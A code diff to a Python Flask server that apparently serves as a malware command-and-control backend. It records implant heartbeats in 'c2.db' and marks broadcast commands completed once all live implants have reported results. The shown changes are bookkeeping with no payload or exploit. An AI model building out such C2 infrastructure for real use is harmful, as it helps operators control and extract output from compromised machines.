@@ -23,18 +23,18 @@ def heartbeat():
         conn   = sqlite3.connect("c2.db")
         cursor = conn.cursor()
         cursor.execute("""
-            INSERT INTO implants (hostname, ip, port, last_heartbeat)
-            VALUES (?, ?, ?, ?)
+            INSERT INTO implants (hostname, ip, port, last_heartbeat, registered_at)
+            VALUES (?, ?, ?, ?, ?)
             ON CONFLICT(ip, port) DO UPDATE SET
               last_heartbeat = excluded.last_heartbeat,
               hostname       = excluded.hostname
-        """, (hostname, ip, port, now))
+        """, (hostname, ip, port, now, now))
         conn.commit()
     except sqlite3.Error as e:
         print(f"⚠️ SQLite ERROR inserting implant row - {e}")
         return jsonify({"message": str(e)}), 500
 
-    print(f"💓 - Heartbeat from {hostname} ({ip}:{port}) at {now}")
+    # print(f"💓 - Heartbeat from {hostname} ({ip}:{port}) at {now}")
     return "OK", 200
 
 
@@ -128,6 +128,7 @@ def report():
 
     try:
         conn = sqlite3.connect('c2.db')
+        conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
 
         for r in bulk:
@@ -149,10 +150,38 @@ def report():
             
             cursor.execute("""
                 INSERT OR IGNORE INTO results
-                  (command_id, implant_id, output, received_at)
+                (command_id, implant_id, output, received_at)
                 VALUES (?, ?, ?, ?)
             """, (cmd_id, implant_id, output, ts))
 
+            cursor.execute("SELECT target FROM commands WHERE id = ?", (cmd_id,))
+            cmd = cursor.fetchone()
+            target = cmd["target"]
+
+            if target == "*":
+
+                cursor.execute("""
+                SELECT COUNT(*) FROM results WHERE command_id = ?
+                """, (cmd_id,))
+                reported = cursor.fetchone()[0]
+
+                cursor.execute("""
+                    SELECT COUNT(*) 
+                    FROM implants
+                    WHERE strftime('%s','now') - strftime('%s', last_heartbeat) <= ?
+                """, (30,))
+                alive_implants = cursor.fetchone()[0]
+
+                if reported >= alive_implants:
+                    cursor.execute(
+                        "UPDATE commands SET status = 'completed' WHERE id = ?",
+                        (cmd_id,)
+                    )
+            else:
+                cursor.execute(
+                    "UPDATE commands SET status = 'completed' WHERE id = ?",
+                    (cmd_id,)
+                )
         conn.commit()
         conn.close()
 
